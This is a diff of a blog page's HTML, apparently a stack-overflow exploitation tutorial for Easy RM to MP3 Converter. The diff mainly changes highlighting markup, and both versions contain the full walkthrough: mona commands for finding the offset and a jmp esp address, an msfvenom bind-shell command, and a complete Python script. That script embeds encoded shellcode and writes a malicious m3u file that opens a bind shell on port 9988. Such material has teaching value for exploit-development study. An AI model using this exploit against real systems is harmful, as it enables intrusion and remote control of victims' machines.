@@ -12,7 +12,7 @@
   
   <meta itemprop="keywords" content="exploitation, seh, overflow, exploit" />
   
-    <meta itemprop="wordCount" content="551">
+    <meta itemprop="wordCount" content="505">
   
 
   <meta property="og:title" content="Easy RM to MP3 Converter" />
@@ -38,7 +38,8 @@
   
   
 
-  <link href="" rel="alternate" type="application/rss+xml" title="camelinc" />
+  
+
   <link href="http://camelinc.info//css/bootstrap.min.css" rel="stylesheet">
   <link href="http://camelinc.info//css/hc.css" rel="stylesheet">
 
@@ -50,7 +51,7 @@
   
   <link rel="stylesheet" href="http://camelinc.info//lightbox/css/lightbox.css" type="text/css" media="screen">
 
-  <meta name="generator" content="Hugo 0.18.1" />
+  <meta name="generator" content="Hugo 0.37.1" />
   <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
   
   
@@ -146,14 +147,12 @@
 <p>First of all we need to identify the appropriate buffer size for the exploit.
 To do this, we  simply execute the following python script.</p>
 
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span></span><span class="lineno">1 </span><span class="nb">buffer</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">30000</span>
-<span class="lineno">2 </span>
-<span class="lineno">3 </span><span class="n">filename</span><span class="o">=</span><span class="s2">&quot;evil.m3u&quot;</span>
-<span class="lineno">4 </span><span class="n">evilfile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span> <span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>
-<span class="lineno">5 </span><span class="n">evilfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span>
-<span class="lineno">6 </span><span class="n">evilfile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ln">1</span><span class="nb">buffer</span> <span class="o">=</span> <span class="sa"></span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">30000</span>
+<span class="ln">2</span>
+<span class="ln">3</span><span class="n">filename</span><span class="o">=</span><span class="sa"></span><span class="s2">&#34;evil.m3u&#34;</span>
+<span class="ln">4</span><span class="n">evilfile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span> <span class="p">,</span> <span class="sa"></span><span class="s1">&#39;w&#39;</span><span class="p">)</span>
+<span class="ln">5</span><span class="n">evilfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span>
+<span class="ln">6</span><span class="n">evilfile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>
 
 <h1 id="identifying-eip-offset">Identifying EIP Offset</h1>
 
@@ -173,9 +172,7 @@ Boom, the application crashes.</p>
 <p>It seems that we can simply overwrite EIP.
 In order to identify the correct offset of the overflow let&rsquo;s create a pattern and start again.</p>
 
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span></span><span class="go">!mona pc 5000</span>
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">!mona pc 5000</code></pre></div>
 
 <p>For this run 25k As are followed by the pattern.
 This time we directly start the application via Immunity.
@@ -193,9 +190,7 @@ The application crashes and we now have a unique pattern stored in EIP.</p>
 
 <p>When the debugger stops because of the overflow we can identify the correct offset for our custom EIP.</p>
 
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span></span><span class="go">!mona findmsp</span>
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">!mona findmsp</code></pre></div>
 
 
 
@@ -226,9 +221,7 @@ This gives us power over EIP.</p>
 <p>The next step is to jump to a shellcode.
 Mona helps finding an appropriate address in memory.</p>
 
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span></span><span class="go">!mona jmp -r esp</span>
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">!mona jmp -r esp</code></pre></div>
 
 
 
@@ -249,9 +242,7 @@ This allows us to jump to ESP.</p>
 Before generating a payload, we also have to check for <strong>bad characters</strong>.
 Mona also provides help and can create an array with excluded characters.</p>
 
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span></span><span class="go">!mona bytearray -b &#39;\x00\x0A&#39;</span>
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">!mona bytearray -b &#39;\x00\x0A&#39;</code></pre></div>
 
 <p>The array has to be included in the buffer.
 Subsequently, bad characters can be identified in a debugger.</p>
@@ -268,9 +259,7 @@ Subsequently, bad characters can be identified in a debugger.</p>
 
 <p>Mona also provides a command to help with this step of exploit development.</p>
 
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span></span><span class="go">!mona compare -f bytearray.bin</span>
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">!mona compare -f bytearray.bin</code></pre></div>
 
 <h1 id="adding-shellcode">Adding Shellcode</h1>
 
@@ -278,62 +267,58 @@ Subsequently, bad characters can be identified in a debugger.</p>
 Metasploit provides numerous payloads to choose from.
 Most importantly, the payload has to be encoded as to eliminate any bad characters.</p>
 
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span></span><span class="go">msfvenom -p windows/console_bind_tcp LPORT=9988 -f python --platform win --arch x86 -b &#39;\x00\x0a\x0d&#39;</span>
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">msfvenom -p windows/console_bind_tcp LPORT=9988 -f python --platform win --arch x86 -b &#39;\x00\x0a\x0d&#39;</code></pre></div>
 
 <h1 id="the-exploit">The Exploit</h1>
 
 <p>Following this, the payload has to be added to the exploit script.
 The final step is to create the malicious m3u file and manually load it into the software.</p>
 
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span></span><span class="lineno"> 1 </span><span class="ch">#!/usr/bin/python -w</span>
-<span class="lineno"> 2 </span>
-<span class="lineno"> 3 </span><span class="kn">import</span> <span class="nn">struct</span>
-<span class="lineno"> 4 </span>
-<span class="lineno"> 5 </span><span class="c1">#-------------------------------------------------------------------------------------------------------#</span>
-<span class="lineno"> 6 </span><span class="c1"># msfvenom -p windows/console_bind_tcp LPORT=9988 -f python --platform win --arch x86 -b &#39;\x00\x0A\x0D&#39; #</span>
-<span class="lineno"> 7 </span><span class="c1"># [*] x86/shikata_ga_nai succeeded with size 368 (iteration=1)                                          #</span>
-<span class="lineno"> 8 </span><span class="c1">#-------------------------------------------------------------------------------------------------------#</span>
-<span class="lineno"> 9 </span><span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span>
-<span class="lineno">10 </span><span class="s2">&quot;</span><span class="se">\xdb\xd0\xbb\x36\xcc\x70\x15\xd9\x74\x24\xf4\x5a\x33\xc9\xb1</span><span class="s2">&quot;</span>
-<span class="lineno">11 </span><span class="s2">&quot;</span><span class="se">\x56\x83\xc2\x04\x31\x5a\x14\x03\x5a\x22\x2e\x85\xe9\xa2\x27</span><span class="s2">&quot;</span>
-<span class="lineno">12 </span><span class="s2">&quot;</span><span class="se">\x66\x12\x32\x58\xee\xf7\x03\x4a\x94\x7c\x31\x5a\xde\xd1\xb9</span><span class="s2">&quot;</span>
-<span class="lineno">13 </span><span class="s2">&quot;</span><span class="se">\x11\xb2\xc1\x4a\x57\x1b\xe5\xfb\xd2\x7d\xc8\xfc\xd2\x41\x86</span><span class="s2">&quot;</span>
-<span class="lineno">14 </span><span class="s2">&quot;</span><span class="se">\x3e\x74\x3e\xd5\x12\x56\x7f\x16\x67\x97\xb8\x4b\x87\xc5\x11</span><span class="s2">&quot;</span>
-<span class="lineno">15 </span><span class="s2">&quot;</span><span class="se">\x07\x35\xfa\x16\x55\x85\xfb\xf8\xd1\xb5\x83\x7d\x25\x41\x3e</span><span class="s2">&quot;</span>
-<span class="lineno">16 </span><span class="s2">&quot;</span><span class="se">\x7f\x76\xf9\x35\x37\x6e\x72\x11\xe8\x8f\x57\x41\xd4\xc6\xdc</span><span class="s2">&quot;</span>
-<span class="lineno">17 </span><span class="s2">&quot;</span><span class="se">\xb2\xae\xd8\x34\x8b\x4f\xeb\x78\x40\x6e\xc3\x75\x98\xb6\xe4</span><span class="s2">&quot;</span>
-<span class="lineno">18 </span><span class="s2">&quot;</span><span class="se">\x65\xef\xcc\x16\x18\xe8\x16\x64\xc6\x7d\x8b\xce\x8d\x26\x6f</span><span class="s2">&quot;</span>
-<span class="lineno">19 </span><span class="s2">&quot;</span><span class="se">\xee\x42\xb0\xe4\xfc\x2f\xb6\xa3\xe0\xae\x1b\xd8\x1d\x3b\x9a</span><span class="s2">&quot;</span>
-<span class="lineno">20 </span><span class="s2">&quot;</span><span class="se">\x0f\x94\x7f\xb9\x8b\xfc\x24\xa0\x8a\x58\x8b\xdd\xcd\x05\x74</span><span class="s2">&quot;</span>
-<span class="lineno">21 </span><span class="s2">&quot;</span><span class="se">\x78\x85\xa4\x61\xfa\xc4\xa0\x46\x31\xf7\x30\xc0\x42\x84\x02</span><span class="s2">&quot;</span>
-<span class="lineno">22 </span><span class="s2">&quot;</span><span class="se">\x4f\xf9\x02\x2f\x18\x27\xd4\x50\x33\x9f\x4a\xaf\xbb\xe0\x43</span><span class="s2">&quot;</span>
-<span class="lineno">23 </span><span class="s2">&quot;</span><span class="se">\x74\xef\xb0\xfb\x5d\x8f\x5a\xfc\x62\x5a\xcc\xac\xcc\x34\xad</span><span class="s2">&quot;</span>
-<span class="lineno">24 </span><span class="s2">&quot;</span><span class="se">\x1c\xad\xe4\x45\x77\x22\xdb\x76\x78\xe8\x6a\xb1\xb6\xc8\x3f</span><span class="s2">&quot;</span>
-<span class="lineno">25 </span><span class="s2">&quot;</span><span class="se">\x56\xbb\xee\x98\xa2\x32\x08\x8c\xba\x12\x82\x38\x79\x41\x1b</span><span class="s2">&quot;</span>
-<span class="lineno">26 </span><span class="s2">&quot;</span><span class="se">\xdf\x82\xa3\x37\x48\x15\xfb\x51\x4e\x1a\xfc\x77\xfd\xb7\x54</span><span class="s2">&quot;</span>
-<span class="lineno">27 </span><span class="s2">&quot;</span><span class="se">\x10\x75\xd4\x60\x01\x8a\xf1\xc0\x48\xb3\x92\x9b\x24\x76\x02</span><span class="s2">&quot;</span>
-<span class="lineno">28 </span><span class="s2">&quot;</span><span class="se">\x9b\x6c\xe0\xa7\x0e\xeb\xf0\xae\x32\xa4\xa7\xe7\x85\xbd\x2d</span><span class="s2">&quot;</span>
-<span class="lineno">29 </span><span class="s2">&quot;</span><span class="se">\x1a\xbf\x17\x53\xe7\x59\x5f\xd7\x3c\x9a\x5e\xd6\xb1\xa6\x44</span><span class="s2">&quot;</span>
-<span class="lineno">30 </span><span class="s2">&quot;</span><span class="se">\xc8\x0f\x26\xc1\xbc\xdf\x71\x9f\x6a\xa6\x2b\x51\xc4\x70\x87</span><span class="s2">&quot;</span>
-<span class="lineno">31 </span><span class="s2">&quot;</span><span class="se">\x3b\x80\x05\xeb\xfb\xd6\x09\x26\x8a\x36\xbb\x9f\xcb\x49\x74</span><span class="s2">&quot;</span>
-<span class="lineno">32 </span><span class="s2">&quot;</span><span class="se">\x48\xdc\x32\x68\xe8\x23\xe9\x28\x18\x6e\xb3\x19\xb1\x37\x26</span><span class="s2">&quot;</span>
-<span class="lineno">33 </span><span class="s2">&quot;</span><span class="se">\x18\xdc\xc7\x9d\x5f\xd9\x4b\x17\x20\x1e\x53\x52\x25\x5a\xd3</span><span class="s2">&quot;</span>
-<span class="lineno">34 </span><span class="s2">&quot;</span><span class="se">\x8f\x57\xf3\xb6\xaf\xc4\xf4\x92</span><span class="s2">&quot;</span><span class="p">)</span>
-<span class="lineno">35 </span>
-<span class="lineno">36 </span><span class="nb">buffer</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">26109</span>
-<span class="lineno">37 </span><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt; L&#39;</span><span class="p">,</span><span class="mh">0x77c72eee</span><span class="p">)</span> <span class="c1"># jmp esp [msv1_0.dll]</span>
-<span class="lineno">38 </span><span class="nb">buffer</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">25</span>
-<span class="lineno">39 </span><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">shellcode</span>
-<span class="lineno">40 </span><span class="nb">buffer</span> <span class="o">+=</span> <span class="s2">&quot;C&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">30000</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>
-<span class="lineno">41 </span>
-<span class="lineno">42 </span><span class="n">filename</span><span class="o">=</span><span class="s2">&quot;evil.m3u&quot;</span>
-<span class="lineno">43 </span><span class="n">evilfile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span> <span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>
-<span class="lineno">44 </span><span class="n">evilfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span>
-<span class="lineno">45 </span><span class="n">evilfile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ln"> 1</span><span class="ch">#!/usr/bin/python -w</span>
+<span class="ln"> 2</span>
+<span class="ln"> 3</span><span class="kn">import</span> <span class="nn">struct</span>
+<span class="ln"> 4</span>
+<span class="ln"> 5</span><span class="c1">#-------------------------------------------------------------------------------------------------------#</span>
+<span class="ln"> 6</span><span class="c1"># msfvenom -p windows/console_bind_tcp LPORT=9988 -f python --platform win --arch x86 -b &#39;\x00\x0A\x0D&#39; #</span>
+<span class="ln"> 7</span><span class="c1"># [*] x86/shikata_ga_nai succeeded with size 368 (iteration=1)                                          #</span>
+<span class="ln"> 8</span><span class="c1">#-------------------------------------------------------------------------------------------------------#</span>
+<span class="ln"> 9</span><span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span>
+<span class="ln">10</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\xdb\xd0\xbb\x36\xcc\x70\x15\xd9\x74\x24\xf4\x5a\x33\xc9\xb1</span><span class="s2">&#34;</span>
+<span class="ln">11</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x56\x83\xc2\x04\x31\x5a\x14\x03\x5a\x22\x2e\x85\xe9\xa2\x27</span><span class="s2">&#34;</span>
+<span class="ln">12</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x66\x12\x32\x58\xee\xf7\x03\x4a\x94\x7c\x31\x5a\xde\xd1\xb9</span><span class="s2">&#34;</span>
+<span class="ln">13</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x11\xb2\xc1\x4a\x57\x1b\xe5\xfb\xd2\x7d\xc8\xfc\xd2\x41\x86</span><span class="s2">&#34;</span>
+<span class="ln">14</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x3e\x74\x3e\xd5\x12\x56\x7f\x16\x67\x97\xb8\x4b\x87\xc5\x11</span><span class="s2">&#34;</span>
+<span class="ln">15</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x07\x35\xfa\x16\x55\x85\xfb\xf8\xd1\xb5\x83\x7d\x25\x41\x3e</span><span class="s2">&#34;</span>
+<span class="ln">16</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x7f\x76\xf9\x35\x37\x6e\x72\x11\xe8\x8f\x57\x41\xd4\xc6\xdc</span><span class="s2">&#34;</span>
+<span class="ln">17</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\xb2\xae\xd8\x34\x8b\x4f\xeb\x78\x40\x6e\xc3\x75\x98\xb6\xe4</span><span class="s2">&#34;</span>
+<span class="ln">18</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x65\xef\xcc\x16\x18\xe8\x16\x64\xc6\x7d\x8b\xce\x8d\x26\x6f</span><span class="s2">&#34;</span>
+<span class="ln">19</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\xee\x42\xb0\xe4\xfc\x2f\xb6\xa3\xe0\xae\x1b\xd8\x1d\x3b\x9a</span><span class="s2">&#34;</span>
+<span class="ln">20</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x0f\x94\x7f\xb9\x8b\xfc\x24\xa0\x8a\x58\x8b\xdd\xcd\x05\x74</span><span class="s2">&#34;</span>
+<span class="ln">21</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x78\x85\xa4\x61\xfa\xc4\xa0\x46\x31\xf7\x30\xc0\x42\x84\x02</span><span class="s2">&#34;</span>
+<span class="ln">22</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x4f\xf9\x02\x2f\x18\x27\xd4\x50\x33\x9f\x4a\xaf\xbb\xe0\x43</span><span class="s2">&#34;</span>
+<span class="ln">23</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x74\xef\xb0\xfb\x5d\x8f\x5a\xfc\x62\x5a\xcc\xac\xcc\x34\xad</span><span class="s2">&#34;</span>
+<span class="ln">24</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x1c\xad\xe4\x45\x77\x22\xdb\x76\x78\xe8\x6a\xb1\xb6\xc8\x3f</span><span class="s2">&#34;</span>
+<span class="ln">25</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x56\xbb\xee\x98\xa2\x32\x08\x8c\xba\x12\x82\x38\x79\x41\x1b</span><span class="s2">&#34;</span>
+<span class="ln">26</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\xdf\x82\xa3\x37\x48\x15\xfb\x51\x4e\x1a\xfc\x77\xfd\xb7\x54</span><span class="s2">&#34;</span>
+<span class="ln">27</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x10\x75\xd4\x60\x01\x8a\xf1\xc0\x48\xb3\x92\x9b\x24\x76\x02</span><span class="s2">&#34;</span>
+<span class="ln">28</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x9b\x6c\xe0\xa7\x0e\xeb\xf0\xae\x32\xa4\xa7\xe7\x85\xbd\x2d</span><span class="s2">&#34;</span>
+<span class="ln">29</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x1a\xbf\x17\x53\xe7\x59\x5f\xd7\x3c\x9a\x5e\xd6\xb1\xa6\x44</span><span class="s2">&#34;</span>
+<span class="ln">30</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\xc8\x0f\x26\xc1\xbc\xdf\x71\x9f\x6a\xa6\x2b\x51\xc4\x70\x87</span><span class="s2">&#34;</span>
+<span class="ln">31</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x3b\x80\x05\xeb\xfb\xd6\x09\x26\x8a\x36\xbb\x9f\xcb\x49\x74</span><span class="s2">&#34;</span>
+<span class="ln">32</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x48\xdc\x32\x68\xe8\x23\xe9\x28\x18\x6e\xb3\x19\xb1\x37\x26</span><span class="s2">&#34;</span>
+<span class="ln">33</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x18\xdc\xc7\x9d\x5f\xd9\x4b\x17\x20\x1e\x53\x52\x25\x5a\xd3</span><span class="s2">&#34;</span>
+<span class="ln">34</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x8f\x57\xf3\xb6\xaf\xc4\xf4\x92</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="ln">35</span>
+<span class="ln">36</span><span class="nb">buffer</span> <span class="o">=</span> <span class="sa"></span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">26109</span>
+<span class="ln">37</span><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="sa"></span><span class="s1">&#39;&lt; L&#39;</span><span class="p">,</span><span class="mh">0x77c72eee</span><span class="p">)</span> <span class="c1"># jmp esp [msv1_0.dll]</span>
+<span class="ln">38</span><span class="nb">buffer</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">25</span>
+<span class="ln">39</span><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">shellcode</span>
+<span class="ln">40</span><span class="nb">buffer</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;C&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">30000</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>
+<span class="ln">41</span>
+<span class="ln">42</span><span class="n">filename</span><span class="o">=</span><span class="sa"></span><span class="s2">&#34;evil.m3u&#34;</span>
+<span class="ln">43</span><span class="n">evilfile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span> <span class="p">,</span> <span class="sa"></span><span class="s1">&#39;w&#39;</span><span class="p">)</span>
+<span class="ln">44</span><span class="n">evilfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span>
+<span class="ln">45</span><span class="n">evilfile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>
 
 <p>By loading the m3u file, the payload is executed.</p>
 
@@ -367,15 +352,13 @@ The final step is to create the malicious m3u file and manually load it into the
       
     
     
-      
-    
   </ul>
 
 
 
 <footer>
 
-  <p class="text-muted credit">&copy; 2017. All rights reserved. </p>
+  <p class="text-muted credit">&copy; 2018. All rights reserved. </p>
 
   
   
